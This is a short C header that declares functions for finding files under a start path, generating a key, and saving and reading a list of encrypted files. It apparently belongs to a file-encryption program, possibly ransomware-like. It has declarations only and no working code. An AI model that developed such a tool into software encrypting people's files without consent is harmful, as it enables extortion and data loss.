
#ifndef FUNC
#define FUNC

#include<stdio.h>
#include "struct.h" 
void find_files(List **files, char* start_path);
void save_into_file_encrypted_list(List *l, char * start_path);
void read_from_file_encrypted_files(List **l, char * start_path);
const char *get_filename_ext(const char *filename);
char * get_start_path();
char * generate_key(int length);
#endif